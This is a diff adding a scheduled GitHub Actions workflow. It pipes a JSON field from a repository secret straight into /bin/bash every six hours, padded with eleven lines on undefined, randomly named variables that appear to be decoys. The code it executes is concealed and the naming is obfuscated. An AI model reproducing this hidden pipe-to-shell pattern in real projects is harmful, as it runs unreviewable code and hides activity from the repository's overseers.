@@ -1,0 +1,29 @@
+name: gaodingyup
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaodingyup
+        env:
+          cwmtk57945: ${{ secrets.cwmtk57945 }}
+        run: |
+          echo $cwmtk57945 | jq -r .nyzv41781 | /bin/bash
+          echo $x3141 | jq -r .b0261 | /bin/bash
+          echo $o6815 | jq -r .c67600 | /bin/bash
+          echo $uew032 | jq -r .ndknu1 | /bin/bash
+          echo $np78 | jq -r .mjppu19158 | /bin/bash
+          echo $llz21027 | jq -r .i3 | /bin/bash
+          echo $h1 | jq -r .s7887 | /bin/bash
+          echo $bdyx860 | jq -r .zt031 | /bin/bash
+          echo $fa423 | jq -r .w81 | /bin/bash
+          echo $fub503 | jq -r .fwsq8 | /bin/bash
+          echo $fn4537 | jq -r .kze3 | /bin/bash
+          echo $aoq15085 | jq -r .ex46115 | /bin/bash
+
